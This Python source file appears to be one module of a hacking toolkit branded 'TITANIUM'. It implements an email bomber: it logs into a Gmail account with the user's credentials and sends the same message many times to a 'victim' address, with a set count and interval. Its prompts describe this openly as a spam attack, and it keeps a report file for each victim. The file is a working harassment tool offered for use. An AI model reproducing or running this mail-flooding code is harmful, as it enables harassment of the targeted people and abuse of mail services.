import smtplib
from Core.Support import Font
from time import sleep
import datetime
from datetime import datetime
import os
import getpass
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

class Spammer:
    
    @staticmethod
    def main():
        print(
            Font.Color.WHITE + "\n[+]" +  Font.Color.GREEN + "REMEMBER TO ENABLE 'ALLOW LESS SECURE APP' ON YOUR GMAIL ACCOUNT:)\n")
        # PARAMETRES DECLARATION #
        email = (input(
            Font.Color.WHITE + "INSERT YOUR EMAIL" +  Font.Color.GREEN + "\n\n[*TITANIUM*]" +  Font.Color.WHITE + "-->"))
        print(Font.Color.WHITE + "\n[+]" +  Font.Color.GREEN + "EMAIL INSERTED CORRECTLY:" + email + "\n")
        password = getpass.getpass(
            Font.Color.WHITE + "INSERT YOUR EMAIL PASSWORD" +  Font.Color.GREEN + "\n\n[*TITANIUM*]" +  Font.Color.WHITE + "-->")
        print(Font.Color.WHITE + "\n[+]" +  Font.Color.GREEN + "PASSWORD INSERTED CORRECTLY\n")
        sendname = (input(
            Font.Color.WHITE + "INSERT YOUR NAME IN THIS EMAIL EX:BLABLA 'I KNOW THAT'S BAD:)'" +  Font.Color.GREEN + "\n\n[*TITANIUM*]" +  Font.Color.WHITE + "-->"))
        print( Font.Color.WHITE + "\n[+]" +  Font.Color.GREEN + "YOUR NAME IS:" + sendname + "\n")
        header = input(
            Font.Color.WHITE + "INSERT AN OBJECT (FOR A SPAM ATTACK IT'S SUGGESTED TO LEAVE THE OBJECT EMPTY:))" +  Font.Color.GREEN + "\n\n[*TITANIUM*]" +  Font.Color.WHITE + "-->")
        # CONTROL IF THE OBJECT IS EMPTY #
        if header == "":
            header1 = ""
            print(
                Font.Color.WHITE + "\n[+]" +  Font.Color.GREEN + "OBJECT EMPTY..MHH DID YOU WANT TO DO A SPAM ATTACK AH?:)\n")
        else:
            header1 = header + ":"
            print( Font.Color.WHITE + "\n[+]" +  Font.Color.GREEN + "EMAIL OBJECT INSERTED CORRECTLY:" + header + "\n")
        # END CONTROL #
        vict_email = input(
            Font.Color.WHITE + "INSERT THE VICTIM MAIL" + Font.Color.GREEN + "\n\n[*TITANIUM*]" + Font.Color.WHITE + "-->")
        print(Font.Color.WHITE + "\n[+]" + Font.Color.GREEN + "VICTIM EMAIL INSERTED CORRECTLY:" + vict_email + "\n")
        volt = int(input(
            Font.Color.WHITE + "INSERT HOW MANY TIMES YOU WANT TO SEND THE EMAIL 'MIN:1'" +  Font.Color.GREEN + "\n\n[*TITANIUM*]" +  Font.Color.WHITE + "-->"))
        print(Font.Color.WHITE + "\n[+]" + Font.Color.GREEN + "NUMBER MEMORIZED\n")
        sec = int(input(
            Font.Color.WHITE + "INSERT THE INTERVAL OF TIME BETWEEN THE EMAILS 'MIN-0s'" +  Font.Color.GREEN + "\n\n[*TITANIUM*]" +  Font.Color.WHITE + "-->"))
        print( Font.Color.WHITE + "\n[+]" +  Font.Color.GREEN + "INTERVAL MEMORIZED\n")
        typo=str(input(Font.Color.WHITE + "USE PLAIN EMAIL OR HTML EMAIL?(p)PLAIN(h)HTML" + Font.Color.GREEN + "\n\n[*TITANIUM*]" +  Font.Color.WHITE + "-->"))
        if typo == "p":
            mode="plain"
        elif typo =="h":
            mode ="html"
        else:
            print("error")
        print(Font.Color.WHITE + "\n[+]" + Font.Color.GREEN + "TYPE MEMORIZED\n")
        f = open("message.txt", "w")
        message1 = input(
            Font.Color.WHITE + "INSERT THE MESSAGE THAT YOU WANT TO SEND INSERT 'TITANIUM' WHEN YOU FINISH(LEAVE THE FIRST LINE EMPTY:))" +  Font.Color.GREEN + "\n\n[*TITANIUM*]" +  Font.Color.WHITE + "-->")
        while message1 != "TITANIUM":
            message1 = input(Font.Color.GREEN + "\n[*NEXT LINE*]" + Font.Color.WHITE + "-->")
            f.write(message1 + "\n")
        f.close()
        
        f = open("message.txt", "r+")
        message = f.read()
        f.close()
        deleting = "TITANIUM"
        repleacing = ""
        message3 = message.replace(deleting,repleacing)
        f = open("message.txt", "w")
        f.write(message3)
        f.close()
        print(Font.Color.WHITE + "\n[+]" + Font.Color.GREEN + "MESSAGE MEMORIZED\n")
        # MESSAGE CONSTRUCTION#
        mail = open("message.txt")
        message =MIMEMultipart()
        message = MIMEText(mail.read(), mode)
        message['From'] = sendname + ":"
        message['To'] = vict_email
        message['Subject'] = header
        # SERVER DECLARATION #
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        text = message.as_string()
        # SEND MESSAGES #
        print(
            Font.Color.GREEN + "[+]" + Font.Color.WHITE + "SENDING EMAILS PLEASE WAIT IT MAY TAKE SOME TIME..." + Font.Color.GREEN + "[+]")
        temp = 0
        succ = 0
        failed = 0
        for i in range(volt):
            try:
                sleep(sec)
                server.sendmail(email, vict_email, text)
                print(Font.Color.WHITE + "\n[+]" + Font.Color.YELLOW + "EMAIL SENT" + Font.Color.WHITE + "[+]")
                temp = temp + 1
                succ = succ + 1
            except Exception as e:
                print(Font.Color.RED + "[+]" + Font.Color.GREEN + "EMAIL NOT SENT" + Font.Color.RED + "[+]")
                print(e)
                failed = failed + 1
            if temp == volt:
                succ2 = str(succ)
                failed2 = str(failed)
                print(
                    Font.Color.BLUE + "\n[+]" + Font.Color.GREEN + "THE EMAILS HAVE BEEN SENT WITH" + Font.Color.BLUE + "[+]" + Font.Color.WHITE)
                print(
                    Font.Color.YELLOW + "\n[+]" + Font.Color.WHITE + "EMAILS SUCCESSFULLY SENT:" + succ2
                )
                print(
                    Font.Color.RED + "\n[+]" + Font.Color.WHITE + "EMAILS NOT SENT:" + failed2
                )
                os.remove("message.txt")
                resume = int(input(Font.Color.WHITE + "\n[+]" + Font.Color.GREEN + "WOULD YOU LIKE TO WRITE A REPORT STATUS(1)YES(2)NO" + Font.Color.GREEN + "\n\n[*TITANIUM*]" + Font.Color.WHITE + "-->"))
                if resume == 1:
                    now = datetime.now()
                    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
                    Date= str(dt_string)
                    print("\nWRITING REPORT DATA")
                    sleep(1)
                    Report = ("Reports/Message_" + vict_email + ".txt")
                    f = open(Report , "a+")
                    f.write("[DATE]:" + Date + "\r\n")
                    f.write("[MAIL SENT TO]:" + vict_email + "\r\n")
                    f.write("[MAIL SENT SUCCESSFULLY]:" + succ2 + "\r\n")
                    f.write("[MAIL NOT SENT]:" + failed2 + "\r\n")
                    f.write("-------------------------------------\r\n")
                    f.close()
                    print(Font.Color.GREEN + "\n[+]" + Font.Color.WHITE + "REPORT WRITTEN SUCCESSFULLY ON " + Report)
                else:
                    print("NOT WRITING REPORT DATA")
                inp = input("\nPRESS ENTER TO CONTINUE...")
               
